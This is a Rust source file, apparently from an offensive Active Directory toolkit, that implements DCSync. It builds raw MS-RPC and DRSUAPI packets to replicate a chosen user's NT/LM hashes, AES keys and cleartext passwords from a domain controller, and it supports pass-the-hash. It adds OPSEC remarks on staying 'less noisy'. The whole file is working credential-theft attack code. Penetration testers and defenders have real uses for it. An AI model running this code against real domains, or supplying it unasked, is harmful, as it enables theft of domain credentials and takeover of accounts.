//! DCSync a single user's secrets via MS-DRSR (DRS replication).
//!
//! Replicates a specific user's password hashes from a DC using the
//! Directory Replication Service Remote Protocol.
//!
//! Flow: SMB Auth → IPC$ → \drsuapi pipe → RPC Bind → DRSBind → DRSGetNCChanges → Parse

use colored::Colorize;
use hmac::{Hmac, Mac};
use md4::{Digest as Md4Digest, Md4};
use md5::Md5;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::drsr;
use overthrone_core::proto::smb::SmbSession;
use std::sync::atomic::{AtomicU32, Ordering};
use tracing::{debug, info, warn};

use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

type HmacMd5 = Hmac<Md5>;

// ═══════════════════════════════════════════════════════════
// DRSR Interface UUID & Constants
// ═══════════════════════════════════════════════════════════

/// MS-DRSR DRSUAPI interface UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
const DRSUAPI_UUID: [u8; 16] = [
    0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11, 0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2,
];
/// DRSUAPI interface version
const DRSUAPI_VERSION: (u16, u16) = (4, 0);

/// NDR transfer syntax UUID: 8a885d04-1ceb-11c9-9fe8-08002b104860
const NDR_SYNTAX_UUID: [u8; 16] = [
    0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
];

/// DRS_EXT flags we advertise during DRSBind
const DRS_EXT_BASE: u32 = 0x04000000 // DRS_EXT_STRONG_ENCRYPTION
    | 0x00000004                      // DRS_EXT_RESTORE_USN_OPTIMIZATION
    | 0x00000008                      // DRS_EXT_GETCHGREQ_V5
    | 0x00000100                      // DRS_EXT_GETCHGREPLY_V6
    | 0x00000200                      // DRS_EXT_GETCHGREQ_V8
    | 0x00004000; // DRS_EXT_GETCHGREQ_V10

/// EXOP_REPL_OBJ — extended operation: replicate single object
const EXOP_REPL_OBJ: u32 = 0x00000006;

/// Flags for DRSGetNCChanges
const DRS_INIT_SYNC: u32 = 0x00000020;
const DRS_WRIT_REP: u32 = 0x00000010;
const DRS_NEVER_SYNCED: u32 = 0x00200000;
const DRS_FULL_SYNC_NOW: u32 = 0x00008000;
const DRS_SYNC_URGENT: u32 = 0x00080000;

/// Global auto-incrementing RPC call ID (per MS-RPCE, each request needs a unique call_id)
static CALL_ID: AtomicU32 = AtomicU32::new(1);

fn next_call_id() -> u32 {
    CALL_ID.fetch_add(1, Ordering::Relaxed)
}

/// Extracted secrets from DCSync
#[derive(Debug, Clone, serde::Serialize)]
pub struct DcSyncSecrets {
    pub username: String,
    pub domain: String,
    pub user_rid: u32,
    pub nt_hash: Option<String>,
    pub lm_hash: Option<String>,
    pub aes256_key: Option<String>,
    pub aes128_key: Option<String>,
    pub cleartext_password: Option<String>,
}

/// Perform DCSync to extract a single user's credentials via MS-DRSR.
pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Result<ForgeResult> {
    info!(
        "[dcsync] DCSync for user: {}\\{}",
        config.domain, target_user
    );

    let realm = config.domain.to_uppercase();
    let base_dn = realm
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");
    let user_dn = format!("CN={},CN=Users,{}", target_user, base_dn);

    // ── Credentials ──
    let (user, pass, nt_hash_bytes) = resolve_credentials(config)?;

    // ── 1. SMB session (provides authenticated transport + session key) ──
    info!(
        "[dcsync] Connecting to DC via SMB → \\\\{}\\IPC$",
        config.dc_ip
    );
    let smb = SmbSession::connect(&config.dc_ip, &config.domain, user, pass)
        .await
        .map_err(|e| OverthroneError::Smb(format!("SMB connect failed: {e}")))?;

    // The session key from NTLMSSP is used to decrypt replicated secrets.
    let smb_session_key = smb.session_key().unwrap_or_default();

    info!(
        "[dcsync] {} SMB session established, session key: {} bytes",
        "✓".green(),
        smb_session_key.len()
    );

    // ── 2. RPC Bind to DRSUAPI ──
    let bind_pdu = build_rpc_bind_pdu(&DRSUAPI_UUID, DRSUAPI_VERSION);
    let bind_resp = pipe_transact_reassemble(&smb, "drsuapi", &bind_pdu)
        .await
        .map_err(|e| OverthroneError::custom(format!("RPC bind transport failed: {e}")))?;

    validate_rpc_bind_ack(&bind_resp)?;
    info!("[dcsync] {} RPC bind to DRSUAPI accepted", "✓".green());

    // ── 3. DRSBind (opnum 0) — get DRS context handle ──
    let drs_bind_req = build_drs_bind_request();
    let drs_bind_resp = pipe_transact_reassemble(&smb, "drsuapi", &drs_bind_req)
        .await
        .map_err(|e| OverthroneError::custom(format!("DRSBind failed: {e}")))?;

    let (drs_handle, server_ext) = parse_drs_bind_response(&drs_bind_resp)?;
    info!(
        "[dcsync] {} DRSBind successful — handle acquired, server caps: 0x{:08x}",
        "✓".green(),
        server_ext
    );

    // ── 4. Compute the DRSR decryption key ──
    let drs_session_key = compute_drs_session_key(&smb_session_key, &nt_hash_bytes)?;

    // ── 5. DRSGetNCChanges (opnum 3) — replicate the target object ──
    let nc_dn = base_dn.clone();
    let gnc_req = build_drs_get_nc_changes(&drs_handle, &user_dn, &nc_dn);
    let gnc_resp = pipe_transact_reassemble(&smb, "drsuapi", &gnc_req)
        .await
        .map_err(|e| OverthroneError::custom(format!("DRSGetNCChanges failed: {e}")))?;

    info!("[dcsync] DRSGetNCChanges returned {} bytes", gnc_resp.len());

    // ── 6. Parse the replication response ──
    let secrets = parse_dcsync_response(&gnc_resp, &drs_session_key, &realm);

    let extracted_count = secrets.len();
    let success = extracted_count > 0;

    for s in &secrets {
        info!(
            "  {} {} → NT: {}",
            "✓".green(),
            s.username.bold(),
            s.nt_hash.as_deref().unwrap_or("N/A").red()
        );
        if let Some(ref aes) = s.aes256_key {
            info!("    {} AES256: {}", "→".cyan(), &aes[..32.min(aes.len())]);
        }
        if let Some(ref ct) = s.cleartext_password {
            info!("    {} Cleartext: {}", "→".cyan(), ct.red());
        }
    }

    // ── 7. DRSUnbind (opnum 1) — clean up ──
    let unbind_req = build_drs_unbind(&drs_handle);
    let _ = smb.pipe_transact("drsuapi", &unbind_req).await; // best-effort

    let details = format!(
        "DCSync for {}\\{}\n\
         Target DN: {}\n\
         DC: {}\n\
         Extracted: {} credential(s)\n\n\
         Detection: Event ID 4662 with Replicating Directory Changes\n\
         OPSEC: EXOP_REPL_OBJ (single-object) is less noisy than full NC sync",
        realm, target_user, user_dn, config.dc_ip, extracted_count
    );

    Ok(ForgeResult {
        action: format!("DCSync ({})", target_user),
        domain: config.domain.clone(),
        success,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "DCSync (MS-DRSR Replication)".into(),
            target: format!("{}\\{}", realm, target_user),
            success,
            details,
            cleanup_command: Some(
                "# DCSync is read-only — no cleanup needed\n\
                 # Monitor via Event ID 4662 for detection"
                    .into(),
            ),
        }),
        message: format!(
            "DCSync: extracted {} credential(s) for {}\\{}",
            extracted_count, realm, target_user
        ),
    })
}

// ═══════════════════════════════════════════════════════════
// Multi-Fragment RPC Reassembly
// ═══════════════════════════════════════════════════════════

/// Perform an RPC pipe transaction with multi-fragment PDU reassembly.
///
/// The DC may respond with multiple RPC response fragments when the reply
/// exceeds the max_recv_frag size (4096 bytes). Each fragment has the same
/// call_id but only the last one has pfc_flags bit 1 (PFC_LAST_FRAG) set.
///
/// We accumulate all fragment stub data into a single contiguous buffer.
async fn pipe_transact_reassemble(
    smb: &SmbSession,
    pipe_name: &str,
    request: &[u8],
) -> Result<Vec<u8>> {
    let first_resp = smb.pipe_transact(pipe_name, request).await?;

    if first_resp.len() < 4 {
        return Ok(first_resp);
    }

    let ptype = first_resp[2];

    // If it's a bind_ack (ptype 12) or fault (ptype 3), return immediately
    if ptype == 12 || ptype == 3 || ptype == 13 {
        return Ok(first_resp);
    }

    // For response PDUs (ptype 2): check PFC_LAST_FRAG (bit 1 of pfc_flags)
    let pfc_flags = first_resp[3];
    let is_last = (pfc_flags & 0x02) != 0;

    if is_last {
        // Single-fragment response — return as-is
        return Ok(first_resp);
    }

    // Multi-fragment: accumulate stub data from all fragments
    // First fragment: stub starts at offset 24 (after common + request-specific header)
    let mut assembled = Vec::with_capacity(first_resp.len() * 4);

    // Keep the full first PDU header (24 bytes) + first fragment stub
    assembled.extend_from_slice(&first_resp);

    debug!(
        "[dcsync] Multi-fragment response detected, assembling (first frag: {} bytes)",
        first_resp.len()
    );

    // Read subsequent fragments until we get PFC_LAST_FRAG
    let mut frag_count = 1u32;
    loop {
        // Read next fragment from the pipe (it's already on the pipe, just read)
        let frag = smb.pipe_transact(pipe_name, &[]).await?;

        if frag.len() < 24 {
            warn!(
                "[dcsync] Fragment {} too short ({} bytes), stopping reassembly",
                frag_count,
                frag.len()
            );
            break;
        }

        frag_count += 1;

        // Append only the stub data (skip 24-byte RPC header)
        assembled.extend_from_slice(&frag[24..]);

        let frag_flags = frag[3];
        if (frag_flags & 0x02) != 0 {
            debug!(
                "[dcsync] Last fragment received (#{}, total assembled: {} bytes)",
                frag_count,
                assembled.len()
            );
            break;
        }

        if frag_count > 1000 {
            warn!("[dcsync] Excessive fragments ({}), stopping", frag_count);
            break;
        }
    }

    Ok(assembled)
}

// ═══════════════════════════════════════════════════════════
// Credential Resolution
// ═══════════════════════════════════════════════════════════

fn resolve_credentials<'a>(config: &'a ForgeConfig) -> Result<(&'a str, &'a str, Option<Vec<u8>>)> {
    if let Some(ref pw) = config.password {
        Ok((&config.username, pw.as_str(), None))
    } else if let Some(ref hash) = config.nt_hash {
        let hash_bytes =
            hex_decode(hash).ok_or_else(|| OverthroneError::InvalidHash(hash.clone()))?;
        Ok((&config.username, hash.as_str(), Some(hash_bytes)))
    } else {
        Err(OverthroneError::custom(
            "No credentials provided for DCSync",
        ))
    }
}

// ═══════════════════════════════════════════════════════════
// RPC PDU Builders
// ═══════════════════════════════════════════════════════════

/// Build an RPC bind PDU (type 11)
fn build_rpc_bind_pdu(iface_uuid: &[u8; 16], version: (u16, u16)) -> Vec<u8> {
    let mut pdu = Vec::with_capacity(72);

    let call_id = next_call_id();

    pdu.push(5); // rpc_vers
    pdu.push(0); // rpc_vers_minor
    pdu.push(11); // PTYPE = bind
    pdu.push(0x03); // pfc_flags = first_frag | last_frag
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // packed_drep (LE, ASCII, IEEE)
    pdu.extend_from_slice(&[0x00, 0x00]); // frag_length placeholder
    pdu.extend_from_slice(&[0x00, 0x00]); // auth_length
    pdu.extend_from_slice(&call_id.to_le_bytes());

    pdu.extend_from_slice(&4096u16.to_le_bytes()); // max_xmit_frag
    pdu.extend_from_slice(&4096u16.to_le_bytes()); // max_recv_frag
    pdu.extend_from_slice(&0u32.to_le_bytes()); // assoc_group_id

    // p_context_list: 1 entry
    pdu.push(1); // n_context_elem
    pdu.push(0); // reserved
    pdu.extend_from_slice(&[0x00, 0x00]); // reserved2

    pdu.extend_from_slice(&0u16.to_le_bytes()); // p_cont_id
    pdu.push(1); // n_transfer_syn
    pdu.push(0); // reserved

    pdu.extend_from_slice(iface_uuid);
    pdu.extend_from_slice(&version.0.to_le_bytes());
    pdu.extend_from_slice(&version.1.to_le_bytes());

    pdu.extend_from_slice(&NDR_SYNTAX_UUID);
    pdu.extend_from_slice(&2u32.to_le_bytes());

    // Patch frag_length
    let len = pdu.len() as u16;
    pdu[8] = (len & 0xFF) as u8;
    pdu[9] = (len >> 8) as u8;

    pdu
}

/// Validate an RPC bind_ack response
fn validate_rpc_bind_ack(resp: &[u8]) -> Result<()> {
    if resp.len() < 24 {
        return Err(OverthroneError::custom("RPC bind response too short"));
    }
    if resp[2] != 12 {
        let ptype = resp[2];
        if ptype == 13 {
            return Err(OverthroneError::custom(
                "RPC bind_nak — interface rejected by DC",
            ));
        }
        return Err(OverthroneError::custom(format!(
            "Unexpected RPC ptype in bind response: {} (expected 12 = bind_ack)",
            ptype
        )));
    }
    Ok(())
}

/// Build DRSBind request (opnum 0)
fn build_drs_bind_request() -> Vec<u8> {
    let mut stub = Vec::with_capacity(128);

    // puuidClientDsa
    stub.extend_from_slice(&1u32.to_le_bytes());
    let client_uuid: [u8; 16] = rand::random();
    stub.extend_from_slice(&client_uuid);

    // pextClient → DRS_EXTENSIONS_INT
    stub.extend_from_slice(&2u32.to_le_bytes());

    let ext_payload_size: u32 = 4 + 16 + 4 + 4 + 4 + 16; // 48 bytes
    stub.extend_from_slice(&ext_payload_size.to_le_bytes());
    stub.extend_from_slice(&DRS_EXT_BASE.to_le_bytes());
    stub.extend_from_slice(&[0u8; 16]); // SiteObjGuid
    stub.extend_from_slice(&std::process::id().to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes()); // dwReplEpoch
    stub.extend_from_slice(&0u32.to_le_bytes()); // dwFlagsExt
    stub.extend_from_slice(&[0u8; 16]); // ConfigObjGUID

    build_rpc_request_pdu(0, &stub) // opnum 0 = DRSBind
}

/// Parse DRSBind response to extract the context handle and server flags
fn parse_drs_bind_response(resp: &[u8]) -> Result<(Vec<u8>, u32)> {
    if resp.len() < 28 {
        return Err(OverthroneError::custom("DRSBind response too short"));
    }

    let stub = &resp[24..];

    if stub.len() < 32 {
        return Err(OverthroneError::custom("DRSBind stub data too short"));
    }

    let ext_ptr = u32::from_le_bytes([stub[0], stub[1], stub[2], stub[3]]);
    let mut pos: usize = 4;

    let mut server_flags: u32 = 0;

    if ext_ptr != 0 {
        if pos + 4 > stub.len() {
            return Err(OverthroneError::custom("DRSBind: can't read ext cb"));
        }
        let cb =
            u32::from_le_bytes([stub[pos], stub[pos + 1], stub[pos + 2], stub[pos + 3]]) as usize;
        pos += 4;

        if pos + 4 <= stub.len() {
            server_flags =
                u32::from_le_bytes([stub[pos], stub[pos + 1], stub[pos + 2], stub[pos + 3]]);
        }
        pos += cb;
        pos = (pos + 3) & !3; // align
    }

    // phDrs — 20-byte policy/context handle
    if pos + 20 > stub.len() {
        return Err(OverthroneError::custom(format!(
            "DRSBind: can't read context handle at offset {} (stub len {})",
            pos,
            stub.len()
        )));
    }
    let handle = stub[pos..pos + 20].to_vec();
    pos += 20;

    // Return value (HRESULT)
    if pos + 4 <= stub.len() {
        let hr = u32::from_le_bytes([stub[pos], stub[pos + 1], stub[pos + 2], stub[pos + 3]]);
        if hr != 0 {
            return Err(OverthroneError::custom(format!(
                "DRSBind returned error HRESULT: 0x{:08x}",
                hr
            )));
        }
    }

    debug!("[dcsync] DRS handle: {:02x?}", &handle);
    Ok((handle, server_flags))
}

/// Build DRSGetNCChanges request (opnum 3) for single-object replication
fn build_drs_get_nc_changes(handle: &[u8], object_dn: &str, _nc_dn: &str) -> Vec<u8> {
    let mut stub = Vec::with_capacity(512);

    // phDrs (context handle, 20 bytes)
    stub.extend_from_slice(handle);

    // dwInVersion = 8 (DRS_MSG_GETCHGREQ_V8)
    stub.extend_from_slice(&8u32.to_le_bytes());

    // ═══ DRS_MSG_GETCHGREQ_V8 ═══

    // uuidDsaObjDest
    let dest_uuid: [u8; 16] = rand::random();
    stub.extend_from_slice(&dest_uuid);

    // uuidInvocIdSrc
    stub.extend_from_slice(&[0u8; 16]);

    // pNC: pointer to DSNAME
    stub.extend_from_slice(&1u32.to_le_bytes());

    // usnvecFrom: USN_VECTOR (3 × u64 = 24 bytes, all zeroes)
    stub.extend_from_slice(&[0u8; 24]);

    // pUpToDateVecDest: NULL pointer
    stub.extend_from_slice(&0u32.to_le_bytes());

    // ulFlags
    let flags =
        DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
    stub.extend_from_slice(&flags.to_le_bytes());

    // cMaxObjects = 1
    stub.extend_from_slice(&1u32.to_le_bytes());

    // cMaxBytes = 0
    stub.extend_from_slice(&0u32.to_le_bytes());

    // ulExtendedOp = EXOP_REPL_OBJ
    stub.extend_from_slice(&EXOP_REPL_OBJ.to_le_bytes());

    // ulMoreFlags = 0
    stub.extend_from_slice(&0u32.to_le_bytes());

    // ═══ Deferred pointer data: pNC → DSNAME ═══
    //
    // DSNAME layout:
    //   structLen:  u32
    //   SidLen:     u32
    //   Guid:       16 bytes
    //   Sid:        28 bytes
    //   NameLen:    u32 (character count including null)
    //   --- NDR conformant array ---
    //   MaxCount:   u32
    //   Offset:     u32
    //   ActualCount: u32
    //   StringName: UTF-16LE (with null terminator)

    let nc_utf16: Vec<u8> = object_dn
        .encode_utf16()
        .chain(std::iter::once(0u16)) // null terminator
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let name_char_count = (object_dn.len() + 1) as u32;
    let struct_len: u32 = 4 + 4 + 16 + 28 + 4 + nc_utf16.len() as u32;

    stub.extend_from_slice(&struct_len.to_le_bytes()); // structLen
    stub.extend_from_slice(&0u32.to_le_bytes()); // SidLen
    stub.extend_from_slice(&[0u8; 16]); // Guid (zeroes)
    stub.extend_from_slice(&[0u8; 28]); // Sid (empty)
    stub.extend_from_slice(&name_char_count.to_le_bytes()); // NameLen

    // NDR conformant varying array header
    stub.extend_from_slice(&name_char_count.to_le_bytes()); // MaximumCount
    stub.extend_from_slice(&0u32.to_le_bytes()); // Offset
    stub.extend_from_slice(&name_char_count.to_le_bytes()); // ActualCount
    stub.extend_from_slice(&nc_utf16); // StringName (UTF-16LE)

    // Align to 4 bytes
    while stub.len() % 4 != 0 {
        stub.push(0);
    }

    build_rpc_request_pdu(3, &stub) // opnum 3 = DRSGetNCChanges
}

/// Build DRSUnbind request (opnum 1) — release context handle
fn build_drs_unbind(handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::with_capacity(24);
    stub.extend_from_slice(handle);
    build_rpc_request_pdu(1, &stub)
}

/// Build a generic RPC request PDU (type 0) with auto-incrementing call ID
fn build_rpc_request_pdu(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
    let frag_len = (24 + stub_data.len()) as u16;
    let call_id = next_call_id();

    let mut pdu = Vec::with_capacity(frag_len as usize);

    pdu.push(5); // rpc_vers
    pdu.push(0); // rpc_vers_minor
    pdu.push(0); // PTYPE = request
    pdu.push(0x03); // pfc_flags = first | last
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // packed_drep
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&call_id.to_le_bytes());

    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // p_cont_id
    pdu.extend_from_slice(&opnum.to_le_bytes());

    pdu.extend_from_slice(stub_data);
    pdu
}

// ═══════════════════════════════════════════════════════════
// Session Key Derivation
// ═══════════════════════════════════════════════════════════

/// Compute the DRS session key used for decrypting replicated secrets.
///
/// The DRS protocol uses the NTLMSSP session base key from the SMB
/// authentication. If SMB didn't provide one (e.g. PtH scenario where
/// pavao doesn't expose it), fall back to deriving from the NT hash.
/// Compute the DRS session key used for decrypting replicated secrets.
///
/// The DRS protocol uses the NTLMSSP session base key from the SMB
/// authentication. If SMB didn't provide one (e.g. PtH scenario where
/// pavao doesn't expose it), fall back to deriving from the NT hash.
fn compute_drs_session_key(smb_session_key: &[u8], nt_hash: &Option<Vec<u8>>) -> Result<Vec<u8>> {
    // Primary path: use the SMB session key directly
    if smb_session_key.len() >= 16 {
        return Ok(smb_session_key[..16].to_vec());
    }

    if !smb_session_key.is_empty() {
        let mut key = vec![0u8; 16];
        key[..smb_session_key.len()].copy_from_slice(smb_session_key);
        return Ok(key);
    }

    // Fallback: derive from NT hash when SMB session key is unavailable
    // (Pass-the-Hash scenario)
    // SessionBaseKey = MD4(NT_Hash) per MS-NLMP simplified
    if let Some(hash) = nt_hash {
        if hash.len() >= 16 {
            info!("[dcsync] Deriving session key from NT hash (PtH fallback)");
            let mut md4 = Md4::new();
            md4.update(hash);
            let derived = md4.finalize().to_vec();
            return Ok(derived);
        }
    }

    Err(OverthroneError::custom(
        "No session key available — provide password or NT hash for DCSync",
    ))
}

// ═══════════════════════════════════════════════════════════
// Response Parsing
// ═══════════════════════════════════════════════════════════

/// Parse DCSync response using the DRSR parser in overthrone-core
fn parse_dcsync_response(resp: &[u8], session_key: &[u8], domain: &str) -> Vec<DcSyncSecrets> {
    match drsr::parse_get_nc_changes_reply(resp, session_key) {
        Ok(result) => {
            info!(
                "[dcsync] Parser returned {} objects, more_data={}",
                result.objects.len(),
                result.more_data
            );

            result
                .objects
                .iter()
                .map(|obj| DcSyncSecrets {
                    username: obj.sam_account_name.clone(),
                    domain: domain.to_string(),
                    user_rid: obj.rid.unwrap_or(0),
                    nt_hash: obj.nt_hash.as_ref().map(hex_encode_bytes),
                    lm_hash: obj.lm_hash.as_ref().map(hex_encode_bytes),
                    aes256_key: obj
                        .supplemental_credentials
                        .as_ref()
                        .and_then(|s| s.aes256_key.as_ref().map(hex_encode_bytes)),
                    aes128_key: obj
                        .supplemental_credentials
                        .as_ref()
                        .and_then(|s| s.aes128_key.as_ref().map(hex_encode_bytes)),
                    cleartext_password: obj
                        .supplemental_credentials
                        .as_ref()
                        .and_then(|s| s.cleartext.clone()),
                })
                .collect()
        }
        Err(e) => {
            warn!("[dcsync] Failed to parse DRSGetNCChanges reply: {}", e);
            Vec::new()
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════

fn hex_encode_bytes(data: &Vec<u8>) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

fn hex_decode(hex: &str) -> Option<Vec<u8>> {
    let hex = hex.trim();
    if hex.len() % 2 != 0 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}
